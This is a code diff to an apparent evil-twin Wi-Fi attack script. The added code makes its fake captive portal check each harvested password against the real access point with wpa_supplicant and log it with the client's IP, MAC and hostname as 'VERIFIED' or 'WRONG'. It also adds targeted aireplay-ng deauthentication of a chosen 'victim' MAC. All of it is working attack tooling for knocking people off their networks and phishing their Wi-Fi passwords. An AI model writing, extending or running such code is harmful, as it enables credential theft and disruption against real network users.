@@ -236,6 +236,10 @@ check_programs() {
         missing_packages="${missing_packages} tcpdump"
     fi
 
+    if ! [ -x "$(command -v wpa_supplicant 2>&1)" ]; then
+        missing_packages="${missing_packages} wpasupplicant"
+    fi
+
     if [ -n "${missing_packages}" ]; then
         echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Missing packages:${BOLD_YELLOW}${missing_packages}${WHITE}"
         echo ""
@@ -786,16 +790,20 @@ PYEOF
 
     cat > "${script_path}" << 'PYEOF'
 #!/usr/bin/env python3
-import http.server, urllib.parse, sys, os, datetime, ssl, socket, threading
+import http.server, urllib.parse, sys, os, datetime, ssl, socket, threading, subprocess
 
 ESSID = sys.argv[1] if len(sys.argv) > 1 else "Network"
 LOG_FILE = sys.argv[2] if len(sys.argv) > 2 else "/tmp/passwords.txt"
 HTTP_PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 80
 AP_IFACE = sys.argv[4] if len(sys.argv) > 4 else "at0"
+REAL_BSSID = sys.argv[5] if len(sys.argv) > 5 else ""
+LEASES = sys.argv[6] if len(sys.argv) > 6 else "/var/lib/dhcp/dhcpd.leases-et-auto"
 HTTPS_PORT = 443
+VERIFY_IFACE = "verify0"
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-CERT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "server.crt")
-KEY_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "server.key")
+CERT_FILE = os.path.join(BASE_DIR, "server.crt")
+KEY_FILE = os.path.join(BASE_DIR, "server.key")
 
 if not os.path.exists(CERT_FILE):
     from subprocess import check_call
@@ -854,6 +862,49 @@ p {{ font-size: 14px; color: #8e8e93; margin-top: 8px; }}
 </div></body></html>
 """
 
+def get_client_info(ip):
+    mac = ""
+    hostname = ""
+    try:
+        cur_ip = ""
+        for line in open(LEASES):
+            if line.startswith("lease "):
+                cur_ip = line.split()[1]
+            elif cur_ip == ip and "hardware ethernet" in line:
+                mac = line.split()[2].rstrip(";")
+            elif cur_ip == ip and "client-hostname" in line:
+                hostname = line.split()[1].strip('" ;\t\n')
+    except Exception:
+        pass
+    return mac, hostname
+
+def verify_password(psk):
+    # Try a WPA2 handshake against the REAL access point with the submitted
+    # password. Returns True (correct), False (wrong) or None (unable to verify).
+    try:
+        subprocess.run(["iw", "dev", VERIFY_IFACE, "del"], capture_output=True)
+        r = subprocess.run(["iw", "dev", AP_IFACE, "interface", "add", VERIFY_IFACE, "type", "managed"],
+                           capture_output=True, timeout=5)
+        if r.returncode != 0:
+            return None
+        subprocess.run(["ip", "link", "set", VERIFY_IFACE, "up"], capture_output=True)
+        subprocess.run(["nmcli", "device", "set", VERIFY_IFACE, "managed", "no"], capture_output=True)
+        conf = os.path.join(BASE_DIR, "verify.conf")
+        ssid_esc = ESSID.replace("\\", "\\\\").replace('"', '\\"')
+        psk_esc = psk.replace("\\", "\\\\").replace('"', '\\"')
+        with open(conf, "w") as f:
+            f.write("network={\n  ssid=\"%s\"\n  psk=\"%s\"\n  bssid=%s\n}\n" % (ssid_esc, psk_esc, REAL_BSSID))
+        try:
+            p = subprocess.run(["timeout", "20", "wpa_supplicant", "-i", VERIFY_IFACE, "-c", conf],
+                               capture_output=True, text=True, timeout=25)
+            out = (p.stdout or "") + (p.stderr or "")
+            return "CTRL-EVENT-CONNECTED" in out
+        finally:
+            subprocess.run(["iw", "dev", VERIFY_IFACE, "del"], capture_output=True)
+    except Exception:
+        subprocess.run(["iw", "dev", VERIFY_IFACE, "del"], capture_output=True)
+        return None
+
 AUTHED = False
 
 class Handler(http.server.BaseHTTPRequestHandler):
@@ -882,15 +933,35 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.send_header("Content-type", "text/html; charset=utf-8")
             self.end_headers()
             return
+        ip = self.client_address[0]
+        mac, hostname = get_client_info(ip)
+        who = ip
+        if mac:
+            who += " " + mac
+        if hostname:
+            who += ' "%s"' % hostname
         ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        with open(LOG_FILE, "a") as f:
-            f.write(f"[{ts}] Password: {password}\n")
 
-        import subprocess, os
+        result = verify_password(password)
+        if result is False:
+            with open(LOG_FILE, "a") as f:
+                f.write("[%s] WRONG password '%s' from %s\n" % (ts, password, who))
+            self.send_response(200)
+            self.send_header("Content-type", "text/html; charset=utf-8")
+            self.send_header("Cache-Control", "no-cache")
+            self.end_headers()
+            page = LOGIN_PAGE.format(essid=ESSID).replace("display: none", "display: block")
+            self.wfile.write(page.encode("utf-8"))
+            return
+
         AUTHED = True
+        label = "VERIFIED" if result else "CAPTURED (unverified)"
+        with open(LOG_FILE, "a") as f:
+            f.write("[%s] %s password '%s' from %s\n" % (ts, label, password, who))
+
         subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", AP_IFACE, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", "80"], capture_output=True)
         subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", AP_IFACE, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "443"], capture_output=True)
-        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "dns_forward"), "w") as f:
+        with open(os.path.join(BASE_DIR, "dns_forward"), "w") as f:
             f.write("1\n")
 
         self.send_response(200)
@@ -980,6 +1051,8 @@ cleanup() {
     pkill -f "captive_portal.py" 2>/dev/null || true
     pkill -f "dns_server.py" 2>/dev/null || true
     pkill -f "tcpdump -i" 2>/dev/null || true
+    pkill -f "wpa_supplicant -i verify0" 2>/dev/null || true
+    iw dev verify0 del 2>/dev/null || true
     [ -n "${CLIENT_WATCHER_PID:-}" ] && kill "${CLIENT_WATCHER_PID}" 2>/dev/null || true
     local ap_iface="${AP_IFACE:-at0}"
     iptables -t nat -D PREROUTING -i "${ap_iface}" -p tcp --dport 80 -j REDIRECT --to-port 80 2>/dev/null || true
@@ -1175,10 +1248,30 @@ HCONF
                             d|D)
                                 if [ "${deauth_running}" == true ]; then
                                     pkill -f "aireplay-ng" 2>/dev/null || true
+                                    if [ -n "${MON_IFACE}" ]; then
+                                        ip link set "${MON_IFACE}" down 2>/dev/null || true
+                                        iw dev "${MON_IFACE}" del 2>/dev/null || true
+                                        MON_IFACE=""
+                                    fi
                                     deauth_running=false
-                                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Deauth stopped. Clients can reconnect now (press ${BOLD_YELLOW}d${GREEN} to resume).${WHITE}"
+                                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Deauth stopped. Clients can reconnect now (press ${BOLD_YELLOW}d${GREEN} to deauth again).${WHITE}"
+                                    echo ""
                                 else
-                                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Deauthing clients from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
+                                    echo -e "${WHITE}[${CYAN}?${WHITE}]${GREEN} Deauth mode: ${BOLD_YELLOW}[a]${GREEN}ll clients ${WHITE}| ${BOLD_YELLOW}[t]${GREEN}arget one victim${WHITE}: "
+                                    read -n 1 dmode
+                                    echo ""
+                                    local dmac=""
+                                    if [ "${dmode}" == "t" ] || [ "${dmode}" == "T" ]; then
+                                        echo -e "${WHITE}[${YELLOW}i${WHITE}]${GREEN} Clients already on the fake AP (do not deauth these):${WHITE}"
+                                        awk '/^lease /{ip=$2} /hardware ethernet/{mac=$3; gsub(/;/,"",mac)} /^}/{if(mac!="") print "  " mac "  " ip; mac=""; ip=""}' "${DHCPD_LEASES}" 2>/dev/null
+                                        echo -e -n "${RED}[${CYAN}!${RED}]${WHITE} Enter the ${BOLD_RED}MAC${WHITE} of the victim on the real AP (e.g. ${GREEN}9e:94:92:fb:ec:04${WHITE}): ${GREEN}"
+                                        read dmac
+                                        if ! [[ "${dmac}" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then
+                                            echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Invalid MAC address.${WHITE}"
+                                            echo ""
+                                            continue
+                                        fi
+                                    fi
                                     if [ -z "${MON_IFACE}" ]; then
                                         MON_IFACE="mon0"
                                         local mon_n=0
@@ -1190,8 +1283,15 @@ HCONF
                                         ip link set "${MON_IFACE}" up
                                     fi
                                     iw dev "${MON_IFACE}" set channel ${selected_channel} 2>/dev/null || iwconfig "${MON_IFACE}" channel ${selected_channel} 2>/dev/null
-                                    run_background "aireplay-ng -0 0 -a ${selected_bssid} ${MON_IFACE} --ignore-negative-one" "aireplay-ng"
+                                    if [ -n "${dmac}" ]; then
+                                        echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Targeted deauth of ${BOLD_YELLOW}${dmac}${GREEN} from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
+                                        run_background "aireplay-ng -0 0 -a ${selected_bssid} -c ${dmac} ${MON_IFACE} --ignore-negative-one" "aireplay-ng"
+                                    else
+                                        echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Deauthing all clients from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
+                                        run_background "aireplay-ng -0 0 -a ${selected_bssid} ${MON_IFACE} --ignore-negative-one" "aireplay-ng"
+                                    fi
                                     deauth_running=true
+                                    echo ""
                                 fi
                                 ;;
                             c|C)
@@ -1205,7 +1305,7 @@ HCONF
                                     iptables -I INPUT 1 -i "${wlan}" -j ACCEPT
 
                                     run_background "python3 ${TMP_DIR}/dns_server.py ${AP_ROUTER} ${TMP_DIR}/dns_server.log ${DNS}" "dns_server"
-                                    run_background "python3 ${TMP_DIR}/captive_portal.py '${selected_essid}' ${TMP_DIR}/passwords.txt 80 ${wlan}" "captive_portal"
+                                    run_background "python3 ${TMP_DIR}/captive_portal.py '${selected_essid}' ${TMP_DIR}/passwords.txt 80 ${wlan} ${selected_bssid} ${DHCPD_LEASES}" "captive_portal"
 
                                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Captive portal running. Passwords logged to ${BOLD_CYAN}${TMP_DIR}/passwords.txt${WHITE}"
                                     portal_running=true
